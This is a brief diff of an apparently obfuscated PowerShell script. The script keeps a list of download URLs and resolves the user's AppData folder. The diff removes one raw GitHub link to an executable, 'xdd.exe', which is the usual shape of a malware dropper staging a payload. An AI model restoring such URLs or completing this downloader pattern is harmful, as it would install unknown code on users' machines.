@@ -1,5 +1,5 @@
 $gfgff = @(
-    "https://github.com/jarkacorp/unicaleblaniys/raw/refs/heads/main/xdd.exe"
+    ""
 )
 $dfsgsfdg = [Environment]::GetFolderPath('ApplicationData')
 
